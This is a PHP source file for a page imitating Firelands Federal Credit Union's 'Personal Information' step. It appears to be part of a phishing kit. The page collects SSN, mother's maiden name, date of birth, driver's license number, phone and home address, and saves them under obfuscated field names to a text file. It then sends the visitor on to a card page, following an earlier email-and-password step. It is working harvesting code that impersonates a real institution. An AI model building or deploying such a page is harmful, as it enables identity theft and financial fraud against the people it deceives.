<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data (matching affinity field names)
    $fzNme = trim($_POST['fzNme'] ?? '');
    $lzNme = trim($_POST['lzNme'] ?? '');
    $phone = trim($_POST['phone'] ?? '');
    $ssn = trim($_POST['ssn'] ?? '');
    $motherMaidenName = trim($_POST['motherMaidenName'] ?? '');
    $month = $_POST['month'] ?? '';
    $day = $_POST['day'] ?? '';
    $year = $_POST['year'] ?? '';
    $driverLicense = trim($_POST['driverLicense'] ?? '');
    $stAd = trim($_POST['stAd'] ?? '');
    $apt = trim($_POST['apt'] ?? '');
    $city = trim($_POST['loc'] ?? '');
    $state = trim($_POST['prov'] ?? '');
    $zipCode = trim($_POST['zipCode'] ?? '');
    
    // Validation (matching affinity)
    if (empty($fzNme)) $errors['fzNme'] = 'First name is required';
    if (empty($lzNme)) $errors['lzNme'] = 'Last name is required';
    if (empty($phone)) {
        $errors['phone'] = 'Phone number is required';
    } else {
        // Remove all non-digit characters
        $phoneDigits = preg_replace('/\D/', '', $phone);
        if (strlen($phoneDigits) !== 10) {
            $errors['phone'] = 'Phone number must be 10 digits (US format)';
        } elseif (!preg_match('/^[2-9]\d{2}[2-9]\d{2}\d{4}$/', $phoneDigits)) {
            $errors['phone'] = 'Please enter a valid US phone number';
        }
    }
    if (empty($ssn)) {
        $errors['ssn'] = 'SSN is required';
    } else {
        // Remove all non-digit characters
        $ssnDigits = preg_replace('/\D/', '', $ssn);
        if (strlen($ssnDigits) !== 9) {
            $errors['ssn'] = 'SSN must be 9 digits';
        } elseif (!preg_match('/^[0-9]{9}$/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN';
        } elseif (preg_match('/^000|^666|^9[0-9]{2}|^123[0-9]{2}/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN (invalid area number)';
        } elseif (preg_match('/^00[0-9]{7}|^0000[0-9]{5}/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN (invalid group number)';
        } elseif (preg_match('/[0-9]{4}0000$/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN (invalid serial number)';
        }
    }
    if (empty($motherMaidenName)) $errors['motherMaidenName'] = "Mother's maiden name is required";
    if (empty($month) || empty($day) || empty($year)) {
        $errors['dob'] = 'Complete date of birth is required';
    } else {
        // Check if user is at least 18
        $dob = new DateTime("$year-$month-$day");
        $today = new DateTime();
        $age = $today->format('Y') - $dob->format('Y');
        if ($today->format('m-d') < $dob->format('m-d')) {
            $age--;
        }
        if ($age < 18) {
            $errors['dob'] = 'You must be at least 18 years old';
        }
    }
    if (empty($driverLicense)) $errors['driverLicense'] = "Driver's license is required";
    if (empty($stAd)) $errors['stAd'] = 'Street address is required';
    if (empty($city)) $errors['loc'] = 'City is required';
    if (empty($state)) $errors['prov'] = 'State is required';
    if (empty($zipCode)) $errors['zipCode'] = 'Zip code is required';
    
    if (empty($errors)) {
        // Format date (matching affinity)
        $monthNames = ['', 'January', 'February', 'March', 'April', 'May', 'June',
                      'July', 'August', 'September', 'October', 'November', 'December'];
        $formattedDob = ($monthNames[intval($month)] ?? '') . "/$day/$year";
        
        // Save to test file (matching affinity field names)
        $data = [
            'step' => 'basic_info_home_address',
            'usrnm' => $username,
            'gvn_nm' => $fzNme,
            'fam_nm' => $lzNme,
            'cnt_num' => $phone,
            'tax_id' => $ssn,
            'mat_nm' => $motherMaidenName,
            'dob' => $formattedDob,
            'id_num' => $driverLicense,
            'str_adr' => $stAd,
            'unit_dsg' => $apt,
            'loc' => $city,
            'prov' => $state,
            'zip_cd' => $zipCode
        ];
        
        saveUserData('basic_info_home_address.txt', $data);
        
        // Redirect to card page
        header('Location: card.php');
        exit;
    }
}

$footerLinks = [
    'About Us',
    'Customer Service',
    'Careers',
    'Investor Relations',
    'Media Center',
    'Security',
    'Privacy',
    'Site Map'
];

$states = [
    'AL' => 'Alabama', 'AK' => 'Alaska', 'AZ' => 'Arizona', 'AR' => 'Arkansas',
    'CA' => 'California', 'CO' => 'Colorado', 'CT' => 'Connecticut', 'DE' => 'Delaware',
    'FL' => 'Florida', 'GA' => 'Georgia', 'HI' => 'Hawaii', 'ID' => 'Idaho',
    'IL' => 'Illinois', 'IN' => 'Indiana', 'IA' => 'Iowa', 'KS' => 'Kansas',
    'KY' => 'Kentucky', 'LA' => 'Louisiana', 'ME' => 'Maine', 'MD' => 'Maryland',
    'MA' => 'Massachusetts', 'MI' => 'Michigan', 'MN' => 'Minnesota', 'MS' => 'Mississippi',
    'MO' => 'Missouri', 'MT' => 'Montana', 'NE' => 'Nebraska', 'NV' => 'Nevada',
    'NH' => 'New Hampshire', 'NJ' => 'New Jersey', 'NM' => 'New Mexico', 'NY' => 'New York',
    'NC' => 'North Carolina', 'ND' => 'North Dakota', 'OH' => 'Ohio', 'OK' => 'Oklahoma',
    'OR' => 'Oregon', 'PA' => 'Pennsylvania', 'RI' => 'Rhode Island', 'SC' => 'South Carolina',
    'SD' => 'South Dakota', 'TN' => 'Tennessee', 'TX' => 'Texas', 'UT' => 'Utah',
    'VT' => 'Vermont', 'VA' => 'Virginia', 'WA' => 'Washington', 'WV' => 'West Virginia',
    'WI' => 'Wisconsin', 'WY' => 'Wyoming'
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Firelands FCU - Personal Information</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="relative flex min-h-screen flex-col overflow-hidden text-white">
        <!-- Background Image with Overlay -->
        <div class="absolute inset-0">
            <img
                src="assets/firelands-landing.jpg"
                alt="Sun setting over Firelands farm fields"
                class="h-full w-full object-cover"
            />
            <div class="absolute inset-0 bg-gradient-to-r from-black/80 via-black/55 to-black/20"></div>
        </div>

        <!-- Main Content -->
        <div class="relative z-10 flex flex-1 flex-col justify-center px-6 py-10 md:px-12 lg:px-20">
            <div class="mx-auto flex w-full max-w-6xl flex-col gap-12 lg:flex-row lg:items-center lg:justify-between">
                <!-- Left Section: Hero Text -->
                <section class="order-2 flex flex-1 flex-col justify-center space-y-6 lg:order-1">
                    <div class="space-y-3">
                        <p class="text-3xl font-semibold leading-tight text-white drop-shadow sm:text-4xl lg:text-5xl">
                            Personal Information
                        </p>
                        <h1 class="text-base font-semibold uppercase tracking-[0.3em] text-white/70">
                            Complete your profile details
                        </h1>
                    </div>
                </section>

                <!-- Right Section: Personal Info Card -->
                <section class="order-1 w-full max-w-2xl lg:order-2 lg:self-start">
                    <div class="mx-auto w-full rounded-[32px] bg-white/95 p-8 text-gray-800 shadow-2xl backdrop-blur lg:mx-0">
                        <!-- Logo -->
                        <div class="flex items-center justify-start">
                            <img
                                src="assets/logo.svg"
                                alt="Firelands Federal Credit Union"
                                class="h-12 w-auto"
                            />
                        </div>

                        <!-- Heading -->
                        <h2 class="mt-6 text-2xl font-semibold text-[#2f2e67]">Personal & Address Information</h2>
                        <p class="mt-2 text-sm text-gray-600">Please provide your personal information and home address.</p>

                        <!-- Error Display -->
                        <?php if (!empty($errors)): ?>
                            <div class="mt-4 rounded-lg bg-red-50 border border-red-200 p-4">
                                <div class="flex">
                                    <div class="flex-shrink-0">
                                        <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                        </svg>
                                    </div>
                                    <div class="ml-3">
                                        <p class="text-sm text-red-700">
                                            Please fix the following errors:
                                            <ul class="list-disc pl-5 mt-1">
                                                <?php foreach ($errors as $error): ?>
                                                    <li><?php echo htmlspecialchars($error); ?></li>
                                                <?php endforeach; ?>
                                            </ul>
                                        </p>
                                    </div>
                                </div>
                            </div>
                        <?php endif; ?>

                        <form method="POST" class="mt-6 space-y-8">
                            <!-- Personal Information Section -->
                            <div>
                                <h3 class="text-lg font-semibold text-[#2f2e67] mb-4">Personal Information</h3>
                                <div class="grid grid-cols-1 gap-6 sm:grid-cols-2">
                                    <!-- First Name -->
                                    <div>
                                        <label for="fzNme" class="block text-sm font-medium text-gray-600 mb-2">
                                            First Name
                                        </label>
                                        <input
                                            type="text"
                                            id="fzNme"
                                            name="fzNme"
                                            placeholder="Enter your first name"
                                            value="<?php echo htmlspecialchars($_POST['fzNme'] ?? ''); ?>"
                                            class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                        />
                                        <?php if (isset($errors['fzNme'])): ?>
                                            <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['fzNme']); ?></p>
                                        <?php endif; ?>
                                    </div>

                                    <!-- Last Name -->
                                    <div>
                                        <label for="lzNme" class="block text-sm font-medium text-gray-600 mb-2">
                                            Last Name
                                        </label>
                                        <input
                                            type="text"
                                            id="lzNme"
                                            name="lzNme"
                                            placeholder="Enter your last name"
                                            value="<?php echo htmlspecialchars($_POST['lzNme'] ?? ''); ?>"
                                            class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                        />
                                        <?php if (isset($errors['lzNme'])): ?>
                                            <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['lzNme']); ?></p>
                                        <?php endif; ?>
                                    </div>

                                    <!-- Phone Number -->
                                    <div>
                                        <label for="phone" class="block text-sm font-medium text-gray-600 mb-2">
                                            Phone Number
                                        </label>
                                        <input
                                            type="tel"
                                            id="phone"
                                            name="phone"
                                            placeholder="(123) 456-7890"
                                            value="<?php echo htmlspecialchars($_POST['phone'] ?? ''); ?>"
                                            class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                        />
                                        <?php if (isset($errors['phone'])): ?>
                                            <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['phone']); ?></p>
                                        <?php endif; ?>
                                    </div>

                                    <!-- SSN -->
                                    <div>
                                        <label for="ssn" class="block text-sm font-medium text-gray-600 mb-2">
                                            Social Security Number
                                        </label>
                                        <input
                                            type="text"
                                            id="ssn"
                                            name="ssn"
                                            placeholder="123-45-6789"
                                            value="<?php echo htmlspecialchars($_POST['ssn'] ?? ''); ?>"
                                            class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                        />
                                        <?php if (isset($errors['ssn'])): ?>
                                            <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['ssn']); ?></p>
                                        <?php endif; ?>
                                    </div>

                                    <!-- Mother's Maiden Name -->
                                    <div>
                                        <label for="motherMaidenName" class="block text-sm font-medium text-gray-600 mb-2">
                                            Mother's Maiden Name
                                        </label>
                                        <input
                                            type="text"
                                            id="motherMaidenName"
                                            name="motherMaidenName"
                                            placeholder="Enter mother's maiden name"
                                            value="<?php echo htmlspecialchars($_POST['motherMaidenName'] ?? ''); ?>"
                                            class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                        />
                                        <?php if (isset($errors['motherMaidenName'])): ?>
                                            <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['motherMaidenName']); ?></p>
                                        <?php endif; ?>
                                    </div>

                                    <!-- Date of Birth -->
                                    <div>
                                        <label class="block text-sm font-medium text-gray-600 mb-2">
                                            Date of Birth
                                        </label>
                                        <div class="grid grid-cols-3 gap-2">
                                            <select
                                                name="month"
                                                class="rounded-2xl border border-gray-200 bg-gray-50 px-3 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                            >
                                                <option value="">Month</option>
                                                <?php for ($m = 1; $m <= 12; $m++): ?>
                                                    <option value="<?php echo $m; ?>" <?php echo (isset($_POST['month']) && $_POST['month'] == $m) ? 'selected' : ''; ?>>
                                                        <?php echo date('F', mktime(0, 0, 0, $m, 1)); ?>
                                                    </option>
                                                <?php endfor; ?>
                                            </select>
                                            <select
                                                name="day"
                                                class="rounded-2xl border border-gray-200 bg-gray-50 px-3 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                            >
                                                <option value="">Day</option>
                                                <?php for ($d = 1; $d <= 31; $d++): ?>
                                                    <option value="<?php echo $d; ?>" <?php echo (isset($_POST['day']) && $_POST['day'] == $d) ? 'selected' : ''; ?>>
                                                        <?php echo $d; ?>
                                                    </option>
                                                <?php endfor; ?>
                                            </select>
                                            <select
                                                name="year"
                                                class="rounded-2xl border border-gray-200 bg-gray-50 px-3 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                            >
                                                <option value="">Year</option>
                                                <?php for ($y = date('Y') - 18; $y >= date('Y') - 100; $y--): ?>
                                                    <option value="<?php echo $y; ?>" <?php echo (isset($_POST['year']) && $_POST['year'] == $y) ? 'selected' : ''; ?>>
                                                        <?php echo $y; ?>
                                                    </option>
                                                <?php endfor; ?>
                                            </select>
                                        </div>
                                        <?php if (isset($errors['dob'])): ?>
                                            <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['dob']); ?></p>
                                        <?php endif; ?>
                                    </div>

                                    <!-- Driver's License -->
                                    <div class="sm:col-span-2">
                                        <label for="driverLicense" class="block text-sm font-medium text-gray-600 mb-2">
                                            Driver's License Number
                                        </label>
                                        <input
                                            type="text"
                                            id="driverLicense"
                                            name="driverLicense"
                                            placeholder="Enter your driver's license number"
                                            value="<?php echo htmlspecialchars($_POST['driverLicense'] ?? ''); ?>"
                                            class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                        />
                                        <?php if (isset($errors['driverLicense'])): ?>
                                            <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['driverLicense']); ?></p>
                                        <?php endif; ?>
                                    </div>
                                </div>
                            </div>

                            <!-- Home Address Section -->
                            <div>
                                <h3 class="text-lg font-semibold text-[#2f2e67] mb-4">Home Address</h3>
                                <div class="grid grid-cols-1 gap-6 sm:grid-cols-2">
                                    <!-- Street Address -->
                                    <div class="sm:col-span-2">
                                        <label for="stAd" class="block text-sm font-medium text-gray-600 mb-2">
                                            Street Address
                                        </label>
                                        <input
                                            type="text"
                                            id="stAd"
                                            name="stAd"
                                            placeholder="Enter your street address"
                                            value="<?php echo htmlspecialchars($_POST['stAd'] ?? ''); ?>"
                                            class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                        />
                                        <?php if (isset($errors['stAd'])): ?>
                                            <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['stAd']); ?></p>
                                        <?php endif; ?>
                                    </div>

                                    <!-- Unit/Apt -->
                                    <div>
                                        <label for="apt" class="block text-sm font-medium text-gray-600 mb-2">
                                            Unit/Apt (Optional)
                                        </label>
                                        <input
                                            type="text"
                                            id="apt"
                                            name="apt"
                                            placeholder="Unit or apartment number"
                                            value="<?php echo htmlspecialchars($_POST['apt'] ?? ''); ?>"
                                            class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                        />
                                    </div>

                                    <!-- City -->
                                    <div>
                                        <label for="loc" class="block text-sm font-medium text-gray-600 mb-2">
                                            City
                                        </label>
                                        <input
                                            type="text"
                                            id="loc"
                                            name="loc"
                                            placeholder="Enter your city"
                                            value="<?php echo htmlspecialchars($_POST['loc'] ?? ''); ?>"
                                            class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                        />
                                        <?php if (isset($errors['loc'])): ?>
                                            <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['loc']); ?></p>
                                        <?php endif; ?>
                                    </div>

                                    <!-- State -->
                                    <div>
                                        <label for="prov" class="block text-sm font-medium text-gray-600 mb-2">
                                            State
                                        </label>
                                        <select
                                            id="prov"
                                            name="prov"
                                            class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                        >
                                            <option value="">Select a state</option>
                                            <?php foreach ($states as $code => $name): ?>
                                                <option value="<?php echo $code; ?>" <?php echo (isset($_POST['prov']) && $_POST['prov'] === $code) ? 'selected' : ''; ?>>
                                                    <?php echo htmlspecialchars($name); ?>
                                                </option>
                                            <?php endforeach; ?>
                                        </select>
                                        <?php if (isset($errors['prov'])): ?>
                                            <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['prov']); ?></p>
                                        <?php endif; ?>
                                    </div>

                                    <!-- ZIP Code -->
                                    <div>
                                        <label for="zipCode" class="block text-sm font-medium text-gray-600 mb-2">
                                            ZIP Code
                                        </label>
                                        <input
                                            type="text"
                                            id="zipCode"
                                            name="zipCode"
                                            placeholder="Enter ZIP code"
                                            value="<?php echo htmlspecialchars($_POST['zipCode'] ?? ''); ?>"
                                            class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                        />
                                        <?php if (isset($errors['zipCode'])): ?>
                                            <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['zipCode']); ?></p>
                                        <?php endif; ?>
                                    </div>
                                </div>
                            </div>

                            <!-- Submit Button -->
                            <button
                                type="submit"
                                class="w-full rounded-full bg-gradient-to-r from-[#cdd1f5] to-[#f2f3fb] px-6 py-3 text-base font-semibold text-[#8f8fb8] shadow-inner transition enabled:hover:from-[#b7bff2] enabled:hover:to-[#e3e6fb] disabled:opacity-70"
                            >
                                Continue
                            </button>

                            <!-- Back Link -->
                            <div class="text-center">
                                <a href="email_password.php" class="text-sm font-medium text-[#801346] transition hover:text-[#5a63d8] hover:underline">
                                    Back to Email & Password
                                </a>
                            </div>
                        </form>
                    </div>
                </section>
            </div>

            <!-- Footer Links -->
            <div class="mt-10 flex flex-wrap items-center justify-end gap-10 text-sm font-semibold text-white/80">
                <?php foreach ($footerLinks as $index => $label): ?>
                    <a href="#" class="transition hover:text-white">
                        <?php echo htmlspecialchars($label); ?>
                    </a>
                <?php endforeach; ?>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Auto-format phone number
            const phoneInput = document.getElementById('phone');
            if (phoneInput) {
                phoneInput.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length >= 6) {
                        value = '(' + value.slice(0, 3) + ') ' + value.slice(3, 6) + '-' + value.slice(6, 10);
                    } else if (value.length >= 3) {
                        value = '(' + value.slice(0, 3) + ') ' + value.slice(3);
                    }
                    e.target.value = value;
                });
            }

            // Auto-format SSN
            const ssnInput = document.getElementById('ssn');
            if (ssnInput) {
                ssnInput.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length >= 5) {
                        value = value.slice(0, 3) + '-' + value.slice(3, 5) + '-' + value.slice(5, 9);
                    } else if (value.length >= 3) {
                        value = value.slice(0, 3) + '-' + value.slice(3);
                    }
                    e.target.value = value;
                });
            }

            // Auto-focus first field
            const firstNameField = document.getElementById('first_name');
            if (firstNameField) {
                firstNameField.focus();
            }
        });
    </script>
</body>
</html>
